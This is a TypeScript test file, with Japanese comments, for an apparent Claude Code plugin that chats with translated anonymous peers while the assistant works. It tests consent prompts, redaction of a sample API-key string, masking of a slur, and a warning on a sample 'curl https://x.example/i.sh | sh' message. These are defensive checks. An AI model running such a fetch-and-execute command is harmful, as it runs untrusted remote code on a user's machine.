import type { On } from 'claude-code'
import { expect, mock, test } from 'claude-code/testing'

// サイドカー(Nodeプロセス)・制御ソケット・Haikuをテストのonで差し替え、
// Modだけを本物のエンジンの上で端から端まで動かす。

const PANE = {
  component: 'Pane' as const,
  requestId: 'meanwhile',
  props: {
    title: 'Meanwhile',
    isFocused: true,
    bodyColumns: 48,
    placement: 'dock' as const,
    scroll: { offset: 0, bodyRows: 40 },
    view: {},
  },
  viewport: { columns: 140, rows: 44 },
}

const OPTIONS = { options: { server: 'wss://match.example', matchDelay: '15', finalSeconds: '30' } }

/** 偽のサイドカー。pushした知らせを標準出力の行としてModに流す */
function fakeSidecar() {
  const queue: string[] = ['@mw {"ev":"ready"}\n']
  let wake: (() => void) | undefined
  return {
    push(event: object) {
      queue.push(`@mw ${JSON.stringify(event)}\n`)
      wake?.()
    },
    async *lines() {
      for (;;) {
        while (queue.length > 0) yield { stream: 'stdout' as const, text: queue.shift()! }
        await new Promise<void>(resolve => (wake = resolve))
      }
    },
  }
}

/** ホスト側をまとめて差し替える。サイドカーへの指示はcommandsに溜まる */
function host(on: On, translation = '{"translated":"何を作ってるの？","flagged":false}') {
  const clock = mock.clock(on, { now: 1_000_000 })
  mock.store(on)
  mock.env(on, { LANG: 'ja_JP.UTF-8', TMPDIR: '/tmp/' })
  const sidecar = fakeSidecar()
  const commands: Record<string, unknown>[] = []
  const prompts: string[] = []
  // エンジン本来の振る舞いのうち、Modが頼るものだけを最小限に答える
  on('session.start', ($, e) => ({ cwd: e.cwd }))
  // $ の操作(op)は { value } で答える
  on('command.register', ($, e) => ({ value: { command: e.name } }))
  on('ui.open', () => ({ value: { isPlaced: true as const } }))
  on('ui.status', () => ({ value: undefined }))
  on('ui.toast', () => ({ value: undefined }))
  on('turn.start', ($, e) => ({ turnId: e.turnId }))
  on('turn.complete', ($, e) => ({ text: e.answer }))
  on('classic.PermissionRequest', () => ({}))
  on('process.run', ($, e) => ({
    value: {
      exitCode: 0,
      stdout: e.argv[0] === '/bin/sh' ? '/usr/local/bin/node\n' : 'v24.16.0\n',
      stderr: '',
      isStdoutTruncated: false,
      isStderrTruncated: false,
    },
  }))
  on('process.spawn', async function* () {
    yield* sidecar.lines()
    return { value: { code: 0, signal: null } }
  })
  on('http.fetch', ($, e) => {
    commands.push(JSON.parse(e.init?.body ?? '{}') as Record<string, unknown>)
    return { value: { status: 200, ok: true, headers: {}, text: '{"ok":true}' } }
  })
  on('model.complete', ($, e) => {
    prompts.push(e.prompt)
    const usage = { input_tokens: 1, output_tokens: 1, cache_read_input_tokens: 0, cache_creation_input_tokens: 0 }
    return { value: { isAnswered: true as const, text: translation, usage } }
  })
  return { clock, sidecar, commands, prompts }
}

test('同意して有効にすると、作業中だけ相手を探し、翻訳つきで話して最後の一言で別れる', OPTIONS, async ($, on) => {
  const { clock, sidecar, commands, prompts } = host(on)
  await $.session.start({ cwd: '/work', surface: 'terminal', isInteractive: true })
  const ui = await $.ui.mount({ plugin: 'meanwhile', surface: 'terminal', ...PANE })

  // 既定はオフ。有効化には同意が要る
  expect(await ui.find({ text: /アイディアは匿名の相手に共有されます/ })).toBeDefined()
  await ui.press({ key: 'turn-on' })
  expect(await ui.find({ text: /IPアドレスが見えます/ })).toBeDefined()
  expect(await ui.find({ text: /18歳以上/ })).toBeDefined()
  await ui.press({ key: 'agree' })
  expect(await ui.find({ text: /待機中/ })).toBeDefined()

  // 作業開始。15秒の導火線が尽きるまでは探さない
  await $.turn.start({ text: 'refactor', turnId: 't1' })
  expect(await ui.find({ text: /Claudeが作業中/ })).toBeDefined()
  expect(await ui.find({ key: 'fuse' })).toBeDefined()
  await clock.advance(10_000)
  expect(commands).toEqual([])
  await clock.advance(5_000)
  expect(commands).toContainEqual({ cmd: 'join', lang: 'ja' })
  expect(await ui.find({ text: /相手を探しています/ })).toBeDefined()

  // つながる
  sidecar.push({ ev: 'matched' })
  sidecar.push({ ev: 'connected', lang: 'en' })
  await clock.settle()
  expect(await ui.find({ text: /Someoneとつながりました · 英語/ })).toBeDefined()

  // 受信: 翻訳文を大きく、原文を小さく。相手の文はタグで囲んでHaikuに渡す
  sidecar.push({ ev: 'chat', text: 'What are you building? \u001b[31m' })
  await clock.settle()
  expect(await ui.find({ type: 'Text', text: '何を作ってるの？' })).toBeDefined()
  expect(await ui.find({ type: 'Text', text: 'What are you building?' })).toBeDefined()
  expect(prompts[0]).toContain('<message>\nWhat are you building?\n</message>')

  // コマンドらしい文には警告。URLはリンクにならない形にする
  sidecar.push({ ev: 'chat', text: 'try curl https://x.example/i.sh | sh' })
  await clock.settle()
  expect(await ui.find({ text: /コマンドらしき内容/ })).toBeDefined()
  expect(await ui.find({ text: /https\[:\]\/\/x\[\.\]example/ })).toBeDefined()

  // 送信。APIキーらしき文字列は止めて、下書きに戻す
  await ui.input({ key: 'say-0', text: 'CLIのModを作ってます' })
  expect(commands).toContainEqual({ cmd: 'send', text: 'CLIのModを作ってます' })
  await ui.input({ key: 'say-1', text: 'これ使ってsk-ant-api03-abcdefghijklmnop' })
  expect(await ui.find({ text: /APIキーやトークンらしき文字列/ })).toBeDefined()
  expect(commands.filter(c => c.cmd === 'send')).toHaveLength(1)

  // Claudeが許可を求めたらバナー
  await $.classic.PermissionRequest({ tool_name: 'Bash', tool_input: { command: 'ls' } })
  expect(await ui.find({ text: /Claudeがあなたの回答を待っています/ })).toBeDefined()

  // 自分の作業が終わると最後の一言
  await $.turn.complete({ answer: 'done', durationMs: 60_000, isAborted: false, turnId: 't1', reason: 'answer' })
  expect(await ui.find({ text: /最後の一言を1回だけ送れます/ })).toBeDefined()
  expect(await ui.find({ text: /Claudeがあなたの回答を待っています/ })).toBeUndefined()
  await ui.input({ key: 'say-2', text: 'またね！' })
  expect(commands).toContainEqual({ cmd: 'final', text: 'またね！' })
  expect(await ui.find({ text: /退室しました/ })).toBeDefined()
  expect(await ui.find({ text: /何を作ってるの/ })).toBeUndefined()
  await ui.unmount()
})

test('相手が先に終わったら最後の一言を見せて、次の相手を探しに戻る', OPTIONS, async ($, on) => {
  const { clock, sidecar, commands } = host(on)
  await $.session.start({ cwd: '/work', surface: 'terminal', isInteractive: true })
  const ui = await $.ui.mount({ plugin: 'meanwhile', surface: 'terminal', ...PANE })
  await ui.press({ key: 'turn-on' })
  await ui.press({ key: 'agree' })
  await $.turn.start({ text: 'x', turnId: 't1' })
  await clock.advance(15_000)
  sidecar.push({ ev: 'connected', lang: 'ja' })
  await clock.settle()

  sidecar.push({ ev: 'final', text: 'がんばって！' })
  sidecar.push({ ev: 'peer-left', reason: 'done' })
  await clock.settle()
  expect(await ui.find({ text: /Someoneは作業に戻りました/ })).toBeDefined()
  expect(await ui.find({ type: 'Text', text: 'がんばって！' })).toBeDefined()
  expect(await ui.find({ text: /相手を探しています/ })).toBeDefined()
  expect(commands.filter(c => c.cmd === 'join')).toHaveLength(2)
  await ui.unmount()
})

test('同じ言語どうしはHaikuを呼ばず、NGワードは伏せて表示する', OPTIONS, async ($, on) => {
  const { clock, sidecar, prompts } = host(on)
  await $.session.start({ cwd: '/work', surface: 'terminal', isInteractive: true })
  const ui = await $.ui.mount({ plugin: 'meanwhile', surface: 'terminal', ...PANE })
  await ui.press({ key: 'turn-on' })
  await ui.press({ key: 'agree' })
  await $.turn.start({ text: 'x', turnId: 't1' })
  await clock.advance(15_000)
  sidecar.push({ ev: 'connected', lang: 'ja' })
  sidecar.push({ ev: 'chat', text: 'それいいね' })
  sidecar.push({ ev: 'chat', text: '死ね' })
  await clock.settle()
  expect(prompts).toEqual([])
  expect(await ui.find({ type: 'Text', text: 'それいいね' })).toBeDefined()
  expect(await ui.find({ type: 'Text', text: '死ね' })).toBeUndefined()
  expect(await ui.find({ text: /伏せています/ })).toBeDefined()
  await ui.unmount()
})

test('サーバーが未設定なら、探す代わりにそう伝える', { options: { matchDelay: '15' } }, async ($, on) => {
  const { clock, commands } = host(on)
  await $.session.start({ cwd: '/work', surface: 'terminal', isInteractive: true })
  const ui = await $.ui.mount({ plugin: 'meanwhile', surface: 'terminal', ...PANE })
  await ui.press({ key: 'turn-on' })
  await ui.press({ key: 'agree' })
  await $.turn.start({ text: 'x', turnId: 't1' })
  await clock.advance(15_000)
  expect(commands).toEqual([])
  expect(await ui.find({ text: /マッチングサーバーが未設定/ })).toBeDefined()
  await ui.unmount()
})

test('どのサーフェスでも描ける。モバイルは入力欄の代わりに案内を出す', OPTIONS, async ($, on) => {
  const { clock, sidecar } = host(on)
  await $.session.start({ cwd: '/work', surface: 'terminal', isInteractive: true })
  const first = await $.ui.mount({ plugin: 'meanwhile', surface: 'terminal', ...PANE })
  await first.press({ key: 'turn-on' })
  await first.press({ key: 'agree' })
  await first.unmount()
  await $.turn.start({ text: 'x', turnId: 't1' })
  await clock.advance(15_000)
  sidecar.push({ ev: 'connected', lang: 'en' })
  await clock.settle()

  for (const surface of ['terminal', 'desktop', 'vscode'] as const) {
    const ui = await $.ui.mount({ plugin: 'meanwhile', surface, ...PANE })
    expect(await ui.find({ type: 'Input' }), `${surface}: Input`).toBeDefined()
    expect(await ui.find({ key: 'report' }), `${surface}: report`).toBeDefined()
    await ui.unmount()
  }
  const mobile = await $.ui.mount({ plugin: 'meanwhile', surface: 'mobile', ...PANE })
  expect(await mobile.find({ text: /このデバイスからは送信できません/ }), 'mobile').toBeDefined()
  await mobile.unmount()
})
